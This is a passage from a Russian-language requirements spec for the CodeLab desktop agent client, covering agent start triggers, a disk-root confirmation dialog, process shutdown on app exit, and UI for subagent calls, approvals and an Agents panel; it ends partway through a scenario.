#### Scenario: New session без проекта открывает выбор папки
- **WHEN** проект не выбран, и пользователь нажимает «New session» в сайдбаре
- **THEN** открывается системный выбор папки, агенту ничего не отправлено, сессия не создана; после выбора папки `/work/app` она становится выбранным проектом, агент стартует в `/work/app`, а сессий не прибавилось

#### Scenario: Исчезнувшая папка сессии
- **WHEN** агент работает, и пользователь выбирает сессию `notLoaded` с `cwd` `/work/gone`, которой нет на диске, а профиль окна — встроенный агент
- **THEN** `session/load` не отправлен, агент не перезапущен, активная сессия не меняется, диагностика содержит `Project folder not found: /work/gone.`

#### Scenario: Проект сменили во время проверки папки
- **WHEN** выбран проект `/work/a`, пользователь нажимает «New session», и пока идёт проверка существования `/work/a`, выбирает проект `/work/b`
- **THEN** сессия этого намерения получает `cwd` `/work/a` — ту же папку, что проверялась; `/work/b` применяется к следующему «New session»

#### Scenario: Действие во время восстановления проекта
- **WHEN** проект `/work/app` из снимка ещё восстанавливается, и пользователь нажимает «New session»
- **THEN** действие ждёт восстановления, агент стартует с папкой `/work/app`, сессия создаётся с `cwd` `/work/app`; выбора папки и отказа «нет проекта» нет

#### Scenario: Восстановление не завершилось за таймаут
- **WHEN** чтение снимка зависло дольше 2 с, проект не выбран, и пользователь нажал «New session»
- **THEN** агент не стартует, обращения к workspace нет, открывается выбор папки

#### Scenario: Встроенный резолвер без папки
- **WHEN** `EmbeddedTransportResolver.open` вызван с пустой папкой
- **THEN** он завершается `ClientWorkspaceException`, а открыватель встроенного агента не вызывается

### Requirement: Агент стартует сам
Отдельного шага подключения в рабочем месте НЕ SHALL быть. Агент профиля окна SHALL стартовать, если он не работает (в том числе после сбоя старта), на одном из триггеров (design.md change `require-project-folder`, D11–D17):
1. выбор проекта — «Open folder…» (и Cmd/Ctrl+O), недавний проект, папка, перетащенная на экран без проекта (требование «Открытие папки перетаскиванием»; design.md change `add-empty-project-screen`, D4), проект, восстановленный при запуске, папка, выбранная на шаге onboarding «Open a project» (spec app-onboarding «Шаг «Open a project»»). Если при запуске показан onboarding (spec app-onboarding «Показ onboarding при первом запуске»), выбор проекта и восстановленный проект становятся триггером только после завершения onboarding (spec app-onboarding «Завершение onboarding и старт рабочего места»), а до этого агент окна НЕ SHALL стартовать: выбор на шаге делает папку выбранным проектом сразу, а старт агента откладывается до перехода на рабочее место, где триггер старта при запуске стартует агента в выбранном проекте ровно один раз (design.md change `add-app-onboarding`, D5; design.md change `add-onboarding-project-step`, D5);
2. «New session» в выбранном проекте;
3. фокус на сессии `notLoaded` или `detached`;
4. «Retry» экрана или баннера сбоя.

Агент стартует в папке триггера — она становится корнем процесса. Исключение — триггер 3 для сессии, чей `cwd` — корень диска: корнем процесса SHALL быть выбранный проект, а корень диска — только если проект не выбран, и только после подтверждения (требование «Подтверждение открытия сессии в корне диска»; design.md change `require-project-folder`, Q27 (a)). Сама сессия в любом случае загружается со своим `cwd`. Выбор проекта НЕ SHALL создавать сессию. Если агент уже работает, выбор проекта SHALL сразу запрашивать `session/list` нового проекта, без перезапуска.

- **Один агент на окно, любые папки.** Агент SHALL обслуживать сессии любых папок, передавая каждой её `cwd`. Смена проекта, фокус и создание сессии другой папки НЕ SHALL перезапускать агента и НЕ SHALL прерывать ходы других сессий.
- **Единственный перезапуск** — «Restart agent» / «Reconnect» (страница «Connection», диалог переноса секретов, пункт палитры `/reconnect`) с подтверждением при работе в сессиях; во время старта он вытесняет идущую попытку (spec app-settings «Блок «Behavior» страницы «Connection»»; Q24 (a), Q25 (a)).
- **После сбоя** любой триггер SHALL снова пытаться стартовать агента. Без действия пользователя (или восстановления проекта при запуске) попытки НЕ SHALL начинаться: таймеров и автоповторов нет. Сбой с тем же профилем, корнем процесса и текстом, что предыдущий, НЕ SHALL добавлять новую запись в диагностику; экран сбоя SHALL показывать `Failed again (<n>)`, журнал — `connection.start_failed {profile_id, repeat}` уровня `debug`. Счётчик SHALL сбрасываться успешным стартом (design.md change `require-project-folder`, D13).
- **Повторы.** Параллельные триггеры, пока агент стартует, НЕ SHALL открывать второй транспорт.
- **Последнее намерение фокуса побеждает.** Устаревшее намерение НЕ SHALL менять фокус и показывать ошибку. Сессия, созданная устаревшим намерением после `session/new`, SHALL оставаться в списке без фокуса.
- **Сочетания.** Cmd/Ctrl+N и пункт палитры `new` SHALL быть доступны на рабочем месте всегда, с проектом и без него, независимо от состояния соединения, и SHALL делать то же, что кнопка «New session» сайдбара. С выбранным проектом они создают сессию в нём. Без проекта они открывают системный выбор папки по правилу «New session» без проекта: агент не стартует до выбора, сессия после выбора автоматически не создаётся. Пока выбор папки, запрошенный app, открыт, повторный Cmd/Ctrl+N второй диалог НЕ SHALL открывать (требование «Cmd/Ctrl+O открывает выбор папки»). Подсказка `<shortcut> without a project opens the same folder picker.` в InfoBar экрана без проекта опирается на это правило (design.md change `add-empty-project-screen`, D7а).
- **WebSocket** SHALL подключаться при первом триггере; одно соединение обслуживает все папки.

#### Scenario: ⌘N без проекта открывает выбор папки
- **WHEN** проект не выбран, платформа — macOS, и пользователь нажимает ⌘N на рабочем месте
- **THEN** открывается системный выбор папки, агенту ничего не отправлено, агент не запущен, сессия не создана; после выбора `/work/app` она становится выбранным проектом, агент стартует в `/work/app`, `session/new` не отправлен

#### Scenario: Отмена выбора папки после Ctrl+N
- **WHEN** проект не выбран, платформа — Linux, пользователь нажимает Ctrl+N и закрывает системный диалог без выбора
- **THEN** проект не выбран, агент не запущен, сессия не создана, экран `open-project-screen` по-прежнему показан

#### Scenario: Повторный Ctrl+N при открытом диалоге
- **WHEN** проект не выбран, выбор папки открыт по Ctrl+N, и пользователь снова нажимает Ctrl+N
- **THEN** второй диалог не открывается, порт выбора папки вызван один раз

#### Scenario: Пункт палитры «New session» без проекта
- **WHEN** проект не выбран, и пользователь выбирает в палитре команд пункт `new`
- **THEN** открывается системный выбор папки, как по Ctrl+N; агенту ничего не отправлено, сессия не создана

#### Scenario: Выбор проекта запускает агента без сессии
- **WHEN** агент не запущен, профиль окна — встроенный агент, и пользователь выбирает проект `/work/app` через «Open folder…»
- **THEN** встроенный агент открывается с папкой `/work/app`, сайдбар показывает сессии проекта из `session/list`, `session/new` не отправлен; кнопку Connect пользователь не нажимал

#### Scenario: Сессия другой папки не перезапускает агента
- **WHEN** агент работает с корнем процесса `/work/a`, в сессии `/work/a` идёт ход, и пользователь выбирает проект `/work/b` и нажимает «New session»
- **THEN** открыватель и фабрика транспорта повторно не вызываются, `session/new` отправлен с `cwd` `/work/b`, ход в `/work/a` продолжается и завершается своим ответом

#### Scenario: WebSocket подключается первым триггером
- **WHEN** профиль окна — WebSocket, и пользователь выбирает проект `/work/a`, затем создаёт сессии в `/work/a` и `/work/b`
- **THEN** соединение открыто один раз при выборе проекта, `session/new` отправлены с `cwd` `/work/a` и `/work/b`

#### Scenario: Параллельные триггеры — один агент
- **WHEN** агент не запущен, пользователь выбирает проект `/work/app` и, пока агент открывается, дважды нажимает «New session»
- **THEN** открыватель встроенного агента вызван один раз; фокус у сессии последнего намерения, сессия первого, если агент её создал, есть в списке без фокуса

#### Scenario: Быстрое переключение сессий
- **WHEN** пользователь выбирает сессию `notLoaded` `s1`, и пока идёт её `session/load`, выбирает сессию `s2`
- **THEN** в фокусе `s2`; `s1` после загрузки остаётся в списке открытой, но фокус не получает; ошибок уровня `error` нет

#### Scenario: После сбоя любой триггер повторяет старт
- **WHEN** старт встроенного агента завершился сбоем конфигурации, и пользователь выбирает сессию `notLoaded`, затем нажимает «New session»
- **THEN** каждое действие начинает ровно одну новую попытку; между действиями попыток нет, сколько бы времени ни прошло

#### Scenario: Сессия в корне диска не делает корень диска корнем процесса
- **WHEN** агент не запущен, выбран проект `/work/app`, и пользователь выбирает сессию `notLoaded` с `cwd` `/` и подтверждает `Open`
- **THEN** агент стартует с корнем процесса `/work/app`, а `session/load` отправлен с `cwd` `/`

#### Scenario: Одинаковый сбой не плодит записи
- **WHEN** старт три раза подряд падает с одной и той же ошибкой при том же профиле и корне
- **THEN** в диагностике одна запись уровня `error`, экран сбоя показывает `Failed again (2)`; после исправления и успешного старта следующий сбой — снова новая запись

#### Scenario: Восстановленный проект при первом показе onboarding
- **WHEN** снимок прошлого запуска содержит проект `/work/app`, флага `codelab.app.onboarding_done` нет, и app запускается
- **THEN** пока показан onboarding, открыватель встроенного агента не вызывается; после `Continue in app` на шаге «Open a project» он вызван ровно один раз с папкой `/work/app`

#### Scenario: Папка, выбранная на шаге onboarding
- **WHEN** флага `codelab.app.onboarding_done` нет, агент не запущен, профиль окна — встроенный агент, и пользователь выбирает на шаге «Open a project» папку `/work/app`
- **THEN** до перехода на рабочее место открыватель встроенного агента не вызывается, журнал app содержит `project.start_held`; после перехода он вызван ровно один раз с папкой `/work/app`, отправлен `session/list`, `session/new` не отправлен, `/work/app` первый в недавних проектах

#### Scenario: Выбор после onboarding — обычный триггер
- **WHEN** onboarding завершён через `Skip for now`, проекта нет, и пользователь выбирает на экране без проекта папку `/work/app`
- **THEN** встроенный агент открыт ровно один раз с папкой `/work/app` сразу после выбора, события `project.start_held` нет

#### Scenario: Перетащенная папка запускает агента без сессии
- **WHEN** агент не запущен, проект не выбран, профиль окна — встроенный агент, и пользователь перетаскивает папку `/work/app` на экран без проекта
- **THEN** встроенный агент открывается с папкой `/work/app` ровно один раз, сайдбар показывает сессии проекта из `session/list`, `session/new` не отправлен, `/work/app` добавлен в недавние проекты

### Requirement: Подтверждение открытия сессии в корне диска
Фокус на сессии `notLoaded` или `detached`, чей `cwd` после нормализации (`p.normalize`) — корень файловой системы (`/`, `C:\` и т. п.), SHALL сначала показывать диалог `This session runs in the disk root (<cwd>). The agent gets access to the whole disk. Open anyway?` с кнопками `Open` и `Cancel` (design.md change `require-project-folder`, D24).

- `session/load` и старт агента для этого намерения SHALL идти только после `Open`.
- `Cancel` или закрытие диалога НЕ SHALL менять фокус, статус строки и отправлять агенту сообщения.
- Новое действие фокуса во время диалога SHALL закрывать его как `Cancel`; повторный клик по той же сессии при открытом диалоге SHALL игнорироваться.
- Решение SHALL писаться событием `session.root_open {decision}` без пути.
- Сессии с `cwd` вне корня диска подтверждения НЕ SHALL требовать.

#### Scenario: Open загружает сессию в корне
- **WHEN** в списке сессия `s2` со статусом `notLoaded` и `cwd` `/`, и пользователь выбирает её
- **THEN** показан диалог `This session runs in the disk root (/). The agent gets access to the whole disk. Open anyway?`, агенту ничего не отправлено; после `Open` отправлен `session/load` с `cwd` `/`, и `s2` в фокусе

#### Scenario: Cancel ничего не меняет
- **WHEN** пользователь выбрал `s2` с `cwd` `/` и в диалоге нажал `Cancel`
- **THEN** фокус прежний, `s2` по-прежнему `notLoaded`, `session/load` не отправлен, в журнале `session.root_open` с `decision: cancel`

#### Scenario: Ненормализованный корень
- **WHEN** `cwd` сессии — `/tmp/..` или `//`
- **THEN** диалог показан, как для `/`

#### Scenario: Другое действие во время диалога
- **WHEN** диалог для `s2` открыт, и пользователь выбирает сессию `s3` с `cwd` `/work/app`
- **THEN** диалог закрыт как `Cancel`, `s3` открывается без подтверждения

### Requirement: Выход из приложения завершает процессы клиента
Когда ОС запрашивает выход из приложения (Cmd+Q, закрытие последнего окна; macOS `NSApplication terminate:`), CodeLab SHALL до ответа на запрос закрывать все ресурсы root scope тем же упорядоченным закрытием, что и при закрытии root scope (design.md change `add-client-process-shutdown-on-exit`, D1). Закрытие SHALL завершать дочерние процессы клиента:
- процессы вкладок панели Terminal;
- процессы ACP `terminal/*` внешнего агента;
- процессы инструментов и stdio-серверы MCP встроенного агента — через его остановку;
- процесс внешнего stdio-агента.

Требования к закрытию:
- **Предел.** Ожидание закрытия SHALL быть ограничено 5 s от запроса выхода. По истечении предела приложение SHALL отвечать на запрос выходом, даже если закрытие не завершено. Ответ SHALL всегда разрешать выход: отмены выхода нет (D2). После закрытия или истечения предела приложение SHALL ждать сброса файловых журналов не дольше 500 ms.
- **Параллельность.** Закрытие вкладок Terminal (hangUp, через 3 s принудительное завершение) и закрытие клиентской стороны SHALL идти параллельно (D2). Внутри клиентской стороны Cubit-ы и рабочее пространство SHALL закрываться первыми. После них остановка встроенного агента и закрытие ядра ACP-клиента с его транспортом SHALL идти параллельно: ожидание остановки встроенного агента SHALL NOT задерживать сигналы процессам `terminal/*` и внешнего stdio-агента (D11). Закрытие владельца языка интерфейса (spec app-settings «Язык интерфейса app») SHALL идти третьей параллельной ветвью: оно ждёт запись выбора языка, которая ещё идёт, не дольше 3 s, и это ожидание SHALL NOT задерживать закрытие рабочего пространства, встроенного агента и ядра ACP-клиента с его транспортом (change `add-desktop-localization`, D2).
- **Внешний stdio-агент.** При закрытии root scope ядро ACP-клиента SHALL закрывать транспорт stdio-агента с ожиданием выхода после закрытия stdin 2 s, далее — по требованию agent-transports «Stdio transport» (D3).
- **Изоляция шагов.** Сбой одного шага закрытия SHALL NOT отменять следующие шаги (D5).
- **Идемпотентность.** Повторный запрос выхода и закрытие root scope после выхода SHALL ждать то же закрытие и SHALL NOT повторно слать сигналы процессам (D5).
- **Предел встроенного агента.** Предел 10 s ожидания остановки встроенного агента (требование «Тип подключения «Встроенный агент»») продолжает действовать внутри закрытия root scope. При выходе из приложения его перекрывает общий предел 5 s.
- **ACP.** Перед закрытием клиент SHALL NOT отправлять агенту сообщений, которых не отправлял при закрытии root scope раньше, в том числе `session/cancel` (D7).
- **Журнал.** События выхода — логгер `codelab_desktop.app`, компонент `app` (D6):
  - `app.exit_requested` — без полей;
  - `app.exit_closed` — `duration_ms`;
  - `app.exit_timeout` уровня `warning` — `timeout_ms` и `pending`: имена всех незавершённых к пределу шагов, в том числе ещё не начатых, из набора `terminal`, `cubits`, `workspace`, `embedded`, `migration_offer`, `transport`, `client`, `language` (D10);
  - `app.exit_close_failed` — `error_type`;
  - `app.shutdown_step_failed` уровня `error` — `step` и `error_type`.

  События SHALL NOT содержать путей, команд, аргументов, окружения и текста исключений; `error_type` — имя типа ошибки.

#### Scenario: Выход с внешним stdio-агентом и его terminal-процессом
- **WHEN** приложение подключено к внешнему stdio-агенту, агент создал `terminal/create` с долгой командой, и пользователь нажимает Cmd+Q
- **THEN** до выхода процесса CodeLab terminal-процесс и процесс агента завершены, ответ на запрос выхода — выход не позже 5 s после запроса, в журнале есть `app.exit_requested` и `app.exit_closed`

#### Scenario: Выход во время хода встроенного агента
- **WHEN** встроенный агент выполняет `exec` с долгой командой и подключён к stdio-серверу MCP, и пользователь закрывает последнее окно
- **THEN** ход отменяется, процесс команды и процесс MCP-сервера завершены, журнал сессии встроенного агента содержит итоговую запись хода

#### Scenario: Агент не завершается по сигналам
- **WHEN** внешний stdio-агент игнорирует закрытие stdin и `SIGTERM`, и пользователь нажимает Cmd+Q
- **THEN** агент завершается принудительно, приложение выходит не позже 5 s после запроса (плюс сброс журнала)

#### Scenario: Закрытие не уложилось в предел
- **WHEN** один из шагов закрытия не завершается за 5 s
- **THEN** приложение всё равно выходит, в журнале есть `app.exit_timeout` уровня `warning` с `timeout_ms` и `pending`, содержащим имя этого шага, без путей и текстов ошибок

#### Scenario: Не начатые шаги видны в pending
- **WHEN** закрытие рабочего пространства не завершается за 5 s
- **THEN** `pending` в `app.exit_timeout` содержит `workspace` и все шаги, которые идут после него и ещё не начаты: `embedded`, `migration_offer`, `transport`, `client`

#### Scenario: Зависшая остановка встроенного агента не задерживает внешнего агента
- **WHEN** приложение подключено к внешнему stdio-агенту с работающим terminal-процессом, открытие встроенного агента ещё идёт (переключение профиля) и не завершается, и пользователь нажимает Cmd+Q
- **THEN** закрытие ядра ACP-клиента начинается, не дожидаясь остановки встроенного агента, terminal-процесс и процесс stdio-агента завершены, приложение выходит не позже 5 s после запроса

#### Scenario: Выход во время переподключения
- **WHEN** идёт Reconnect к внешнему stdio-агенту, и пользователь нажимает Cmd+Q до того, как новый процесс агента запущен
- **THEN** после выхода не остаётся ни прежнего, ни нового процесса агента

#### Scenario: Сбой шага закрытия
- **WHEN** закрытие рабочего пространства бросает исключение при выходе
- **THEN** встроенный агент и ядро ACP-клиента всё равно закрываются, в журнале есть `app.shutdown_step_failed` со `step: workspace` и `error_type`, приложение выходит

#### Scenario: Вкладки Terminal не задерживают закрытие клиента
- **WHEN** открыта вкладка Terminal, shell которой не завершается по hangUp, и приложение подключено к внешнему stdio-агенту
- **THEN** закрытие транспорта агента начинается, не дожидаясь 3 s закрытия вкладок, а выход происходит не позже 5 s после запроса

#### Scenario: Повторный запрос выхода
- **WHEN** во время закрытия ОС повторно запрашивает выход, а затем закрывается root scope
- **THEN** оба вызова ждут то же закрытие, процессы не получают сигналов повторно, ошибок нет

#### Scenario: Запись выбора языка не завершилась к пределу
- **WHEN** пользователь выбрал язык на странице «General», запись выбора в `shared_preferences` не завершается, и пользователь нажимает Cmd+Q
- **THEN** закрытие владельца языка ждёт запись не дольше 3 s и не задерживает закрытие рабочего пространства, встроенного агента и ядра ACP-клиента с его транспортом; по истечении 3 s в журнале есть предупреждение `settings.language_save_timeout` с `timeout_ms`, без значения выбора; приложение выходит не позже 5 s после запроса; `pending` в `app.exit_timeout` содержит `language`, только если закрытие владельца языка не завершилось к пределу

### Requirement: Чек-лист задач с id, владельцем и блокерами
Строка чек-листа (требование «Progress checklist reflects the agent's plan») SHALL дополнительно показывать данные пункта из `PlanEntryView`, когда они есть:
- номер `#<id>`;
- метку владельца-субагента (тип агента или id);
- пометку «blocked by #<id>, …» только для незавершённых блокеров.

Пункт без этих данных (план стороннего агента) SHALL показываться как прежде.

Свёрнутая сводка плана над композером (требование «Docked plan summary below the transcript») НЕ SHALL показываться, пока в доке открыта панель Plan — `ToolPane.plan` есть среди открытых панелей дока, даже если активна вкладка другой панели: она дублирует панель (решение пользователя 2026-11-10, design.md change `add-subagents-and-tasks`, D27). При закрытой панели Plan сводка показывается по прежним правилам.

#### Scenario: Пункт за субагентом и с блокером
- **WHEN** план содержит `#1` `pending` и `#2` `in_progress` с `owner: sub_a1` (известный тип `explore`) и `blockedBy: ["1"]`
- **THEN** строка `#2` показывает `#2`, метку `explore` и «blocked by #1»; после того как `#1` стал `completed`, пометки блокера нет

#### Scenario: План без метаданных
- **WHEN** агент присылает `plan` без `_meta`
- **THEN** чек-лист выглядит как до change: без номеров, меток и пометок

#### Scenario: Сводка скрыта при открытой панели Plan
- **WHEN** у сессии есть план с пунктом `in_progress`, и пользователь открывает панель Plan, затем закрывает её
- **THEN** пока панель открыта, сводки над композером нет; после закрытия сводка снова показывает пункт `in_progress`; если при открытой панели Plan активной стала вкладка другой панели, сводки по-прежнему нет

### Requirement: Тихие строки операций со списком задач
Вызов, который kit распознал как операцию со списком задач (acp-client-kit «Операции со списком задач в ленте»), SHALL показываться тихой строкой без рамки, тега статуса и панели вывода: иконка списка и короткий текст из представления kit — например «Tasks #1–#4 added to the plan», «Task #2 done» (D27, артборд 30). Подряд идущие такие вызовы без других элементов ленты между ними SHALL сливаться в одну строку.

Неуспешный вызов (`failed`, например `Invalid task: blocked_by would create a cycle: …`) НЕ SHALL быть тихим: он показывается обычной строкой вызова с причиной (требование «Tool call as a one-line row»).

#### Scenario: Четыре создания подряд
- **WHEN** модель в одном шаге вызывает `task_create` четыре раза, и каждый вызов успешен
- **THEN** лента показывает одну тихую строку «Tasks #1–#4 added to the plan» без тега «Done»

#### Scenario: Ошибка операции видна
- **WHEN** `task_update` отклонён с ошибкой цикла
- **THEN** лента показывает обычную строку вызова со статусом «Failed» и текстом причины

### Requirement: Строка вызова субагента
Вызов `agent` (опознанный по `subagentCall` с первого кадра, D28) SHALL показываться компактной строкой (D27, артборд 30), по умолчанию свёрнутой; вызов стороннего агента без `_meta.codelab.subagent` — обычной строкой `think` со строкой прогресса:
- **свёрнутая строка:** глиф статуса, `Subagent <type>: <description>` (без непустого `rawInput.description` — заголовок вызова как есть; у агента CodeLab это `Subagent <type>` без двоеточия, design.md D41, п. 3), справа — итог-счётчик: у завершённого — сокращённый вид `N tool calls · N.Nk · <время>` из `subagentSummary` (D24), у работающего — `N tool calls` по числу вызовов поддерева, без токенов и без разбора строки прогресса (D25, Q15) и шеврон раскрытия;
- у завершённого `completed` тег «Done» и `#id` назначенного пункта в свёрнутой строке НЕ SHALL показываться: статус передаёт глиф; теги «Failed» и «Cancelled» SHALL оставаться;
- **работающий** вызов под свёрнутой строкой SHALL показывать «хвост» (D25): три последних вызова потомков — глиф статуса, метка и деталь — и строку `+N more tool calls` без токенов (токены — только из `subagentSummary` завершённого, D24, Q15); строка прогресса агента показывается вместо хвоста, только когда вызовов потомков нет (клиент без `subagentToolCalls` или ребёнок ещё ничего не вызвал);
- **раскрытие** показывает дерево шагов потомков (требование «Вложенные вызовы потомков») и текст отчёта;
- без `subagentSummary` (сторонний агент) справа ничего не показывается, остальное — как выше.

Вызовы потомков показываются только вложенными в строку `agent`; отдельными строками верхнего уровня они НЕ SHALL появляться.

#### Scenario: Завершённый субагент свёрнут
- **WHEN** вызов `agent` с типом `explore` и заголовком «Find auth code» завершился с `summary` `{"toolCalls": 4, "tokens": {"input": 15200, "output": 3000}, "durationMs": 48000}`
- **THEN** лента показывает одну строку с глифом успеха, «Subagent explore: Find auth code» и справа «4 tool calls · 18.2k · 48s», без тега «Done»; раскрытие показывает шаги и отчёт

#### Scenario: Неуспешный субагент сохраняет тег
- **WHEN** вызов `agent` завершился `failed`
- **THEN** свёрнутая строка показывает тег «Failed» и итог справа

#### Scenario: Отменённый субагент после перезагрузки
- **WHEN** ход с работающим субагентом отменён, затем сессия загружается заново (`session/load`), и реплей отдаёт вызов `agent` со `status: failed` и `_meta.codelab.outcome: "cancelled"`
- **THEN** свёрнутая строка показывает тег «Cancelled», как до перезагрузки, а не «Failed» (acp-client-kit «Отмена по признаку агента»; D41, п. 1)

#### Scenario: Отклонённый вызов без описания
- **WHEN** модель вызывает `agent` с пустыми аргументами, и проверка отклоняет вызов
- **THEN** свёрнутая строка — «Subagent general» без двоеточия и пустого хвоста, с тегом «Failed» и первой строкой ошибки проверки

#### Scenario: Хвост работающего субагента
- **WHEN** у работающего вызова `agent` пять вызовов потомков
- **THEN** под свёрнутой строкой три последних вызова и «+2 more tool calls» без токенов, справа — «5 tool calls»; строки прогресса нет; после завершения хвост исчезает, справа — итог с токенами из `summary`

#### Scenario: Без дерева — строка прогресса
- **WHEN** клиент не согласовал `subagentToolCalls`, и агент присылает две строки прогресса
- **THEN** под свёрнутой строкой показывается последняя строка прогресса

### Requirement: Запрос одобрения от субагента под строкой корня
Ожидающее одобрение, у которого `PendingApprovalView.subagent` не `null`, SHALL показываться блоком под строкой вызова `agent` корневого уровня (верхняя строка в ленте, `subagent.parentToolCallId`), а не внутри дерева: деревья предков при этом НЕ SHALL раскрываться (D27, артборд 30). Блок содержит:
- путь — типы цепочки от ребёнка корня до спрашивающего через `›` и действие: «review › explore wants to run» (глубина видна по длине пути; неизвестное звено — `…`, acp-client-kit «Запрос одобрения от субагента»);
- заголовок вызова запроса — инструмент и предмет: команду для `execute`, инструмент и путь для правки и записи («Write .codelab/config.yaml»), как в строке вызова корня с ждущим одобрением (требование «Tool call as a one-line row»); заголовок SHALL быть виден без раскрытия блока и без «View raw input», один только путь и заголовок задачи заголовком вызова НЕ SHALL быть;
- тег риска одобрения — тем же видом, что у строки вызова корня с ждущим одобрением. Отдельной видимой пометки критического действия (`PendingApprovalView.critical`) у одобрения корня в app нет; блок потомка своей НЕ SHALL вводить (решение пользователя 2026-11-15 по ручному прогону итерации 3, design.md D44 п. 4);
- обычную панель решения (требование «Approval card inside the tool call row»).

Заголовок задачи спрашивающего (`description`) SHALL быть доступен во всплывающей подсказке пути и в раскрытии блока. Решение, области «Only this time» и «Always», сочетания клавиш и тег исхода SHALL работать как у любого одобрения; после решения блок сворачивается в тег исхода под строкой корня. Раскрытие строки `agent` по-прежнему показывает этот вызов на своём месте в дереве с тем же исходом.

Отдельной строки вызова потомка в ленте без дерева вызовов SHALL не быть (design.md, D43, п. 2). Если строки `agent` с id `subagent.parentToolCallId` в ходе нет (например, после переподключения), одобрение SHALL показываться прежней строкой вызова, объявленного только запросом, в конце хода — с тем же путём.

#### Scenario: Строки корня нет
- **WHEN** запрос ребёнка ссылается на `parentToolCallId`, которого нет в ленте хода
- **THEN** одобрение показывается строкой вызова в конце хода с путём «review wants to run» и обычной панелью решения

#### Scenario: Ребёнок просит команду
- **WHEN** ребёнок `review` с заголовком «Check the diff» просит `exec git diff --stat`
- **THEN** под строкой `agent` корня — блок «review wants to run», команда и панель «Allow»/«Reject»; подсказка пути показывает «Check the diff»; выбор «Allow» отправляет `allow_once` этого запроса

#### Scenario: Ребёнок пишет файл
- **WHEN** ребёнок `general` с заголовком «Update config» просит записать `.codelab/config.yaml`, и агент помечает запрос `_meta.codelab.critical: true`
- **THEN** под строкой `agent` корня — блок «general wants to run» с заголовком вызова «Write .codelab/config.yaml», видимым без раскрытия блока и без «View raw input»; тег риска тот же, что у такого же запроса корня, отдельной пометки критичности у блока нет; выбор «Allow» отправляет `allow_once` этого запроса

#### Scenario: Вопрос внука не раскрывает дерево
- **WHEN** внук `explore` ребёнка `review` просит `exec`, а строка `agent` корня свёрнута
- **THEN** строка корня остаётся свёрнутой, под ней блок «review › explore wants to run» с командой и панелью решения; выбор «Allow» отправляет `allow_once` этого запроса; после раскрытия строки корня вызов `exec` внука виден на своём месте с тегом исхода

### Requirement: Вложенные вызовы потомков
Вызовы с `parentToolCallId` (acp-client-kit «Дерево вызовов потомков») SHALL показываться в раскрытой строке `agent` вложенными строками под строкой своего родительского вызова `agent`, с отступом по глубине (этап 2; D21). Вложенный список SHALL быть свёрнут по умолчанию. Строки потомков SHALL использовать тот же компактный вид, что и строки верхнего уровня, включая тихие строки операций со списком задач.

#### Scenario: Свёрнутые шаги ребёнка
- **WHEN** ребёнок `explore` выполнил три `read` и завершился
- **THEN** строка `agent` свёрнута; раскрытие показывает три строки «Read …» с отступом и отчёт

#### Scenario: Тихие строки потомка
- **WHEN** ребёнок выполнил `read` и два успешных `task_update` подряд
- **THEN** раскрытие строки `agent` показывает строку «Read …» и одну тихую строку операций (например «Tasks #1, #3 done») с отступом, без рамки и тега; операции корня с ней не сливаются (acp-client-kit «Операции ребёнка в дереве»; design.md, D48 п. 3)

### Requirement: Панель Agents v1
CodeLab SHALL предлагать в доке панель Agents со списком субагентов сессии в фокусе из `SessionView.subagents` (acp-client-kit «Список субагентов сессии»; решение пользователя 2026-11-12, Q13; design.md change `add-subagents-and-tasks`, D33; артборд 16 холста «CodeLab Desktop — Feature UI/UX»). Предикат доступности панели (требование «Tool dock with closable pane tabs») — у сессии в фокусе есть хотя бы одна строка `SessionView.subagents`; объявление агента в `initialize` условием НЕ SHALL быть. Недоступная панель не имеет переключателя и вкладки и остаётся в сохранённой раскладке. Панель SHALL быть доступна из палитры наравне с другими панелями дока.

Панель SHALL показывать:
- заголовок «Subagents» со счётчиками по состояниям (`2 running · 1 waiting for approval · 1 done · 1 failed`; нулевые не показываются);
- строку на каждого субагента с отступом по глубине: тип, заголовок, состояние словом (`running`, `waiting for approval`, `done`, `failed`, `cancelled`), время, число вызовов, токены, последнее действие и метки `#N` его пунктов списка (подсказка — заголовок пункта); поля, которых в строке kit нет, не показываются, без заглушек;
- у работающей строки — время, растущее раз в секунду, пока панель видна и сессия занята; в незанятой сессии работающая строка остаётся `running` и времени не показывает (design.md, D50 п. 2);
- у строки `waiting for approval` — действие «Go to approval», которое прокручивает ленту к блоку одобрения под строкой `agent` корневого уровня (требование «Запрос одобрения от субагента под строкой корня»), а для одобрения запуска самой строки, которое спрашивает корень, — к строке этого вызова в ленте (D50 п. 3). Панели решения в панели Agents НЕ SHALL быть: решение принимается только в ленте;
- у каждой строки — действие «Show in transcript»: лента прокручивается к строке `agent` корневого уровня и коротко подсвечивает её; для строки глубже 1 раскрывается путь до её вложенной строки `agent`;
- под списком — дерево шагов выбранной строки: её вызовы и вызовы её потомков в компактном виде строк ленты (требование «Вложенные вызовы потомков»), только для показа; ожидающий вызов в дереве несёт тег и действие «Go to approval».

Выбранная строка SHALL сохраняться по сессиям при смене вкладки дока и сессии в фокусе и НЕ SHALL сохраняться между запусками. Действий «Stop», «Open transcript», «Message», раздела «Background jobs» и строк A2A в панели НЕ SHALL быть (этапы 3–6, D33).

#### Scenario: Панель появляется с первым субагентом
- **WHEN** в сессии без вызовов `agent` модель запускает `agent` `explore` «Find auth code»
- **THEN** до первого кадра вызова переключателя Agents нет; после него переключатель есть, а открытая панель показывает строку `explore` «Find auth code» со состоянием `running` и заголовок «Subagents · 1 running»

#### Scenario: Сторонний агент
- **WHEN** агент без `_meta.codelab.subagent` присылает вызов `think` «Subagent explore: …», а панель Agents сохранена открытой в раскладке
- **THEN** переключателя и вкладки Agents нет, раскладка не меняется; вызов — обычная строка `think` в ленте

#### Scenario: Ребёнок, внук и итог
- **WHEN** ребёнок `review` запускает внука `explore`, внук делает два вызова и завершается с `summary` `{"toolCalls": 2, "tokens": {"input": 9000, "output": 1200}, "durationMs": 19000}`
- **THEN** строка `explore` стоит под строкой `review` с отступом и показывает `done`, «2 tool calls», «10.2k», «19s»; строка `review` — `running` с растущим временем

#### Scenario: Ожидание одобрения и переход к нему
- **WHEN** внук `explore` просит `exec git diff --stat`, а строка `agent` корня в ленте свёрнута и вне экрана
- **THEN** строка `explore` в панели показывает `waiting for approval`, заголовок — «1 waiting for approval»; «Go to approval» прокручивает ленту к блоку «review › explore wants to run», строка корня остаётся свёрнутой; ответ «Allow» в ленте возвращает строку в `running`

#### Scenario: Дерево шагов выбранного потомка
- **WHEN** пользователь выбирает строку `review`, у которой два вызова `read` и вызов `agent` внука с вызовом `ls`
